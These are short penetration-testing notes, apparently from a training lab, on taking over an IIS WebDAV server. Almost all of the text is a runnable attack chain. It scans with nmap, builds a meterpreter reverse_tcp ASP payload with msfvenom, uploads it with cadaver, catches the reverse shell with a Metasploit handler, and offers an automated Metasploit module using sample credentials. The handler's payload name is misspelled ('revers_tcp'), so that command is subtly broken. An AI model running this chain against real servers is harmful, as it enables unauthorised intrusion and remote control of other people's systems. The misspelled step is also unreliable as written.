## Exploiting WebDAV With Metasploit (msfvenom)

```
nmap -sV -p 80 --script=http-enum 10.2.30.230
```

Generating the ASP payload by `msfvenom`
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
```
`-p`: payload
`-f`: specify file format
then output the payload as `shell.asp`

Now utilising `Cadaver` to upload the payload to the site:
```
cadaver http://10.2.30.233/webdav

dav:/webdav/> 
ls
put /root/shell.asp

or to delete
delete shell.asp
```

Set up a listner/TCP-handler:
```
service postgresql start && msfconsole

use multi/handler
set payload windows/meterpreter/revers_tcp
set LHOST 10.10.5.2
set LPORT 1234
run
```
click on shell.asp in the website (directory)
we will get the meterpreter session

Other Method (Automate the proccess): 
```
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
set LHOST & LPORT
set HTTPUsername bob
set HttpPassword password_123321
set RHOSTS
set PATH /webdav/metasploit.asp
run
```
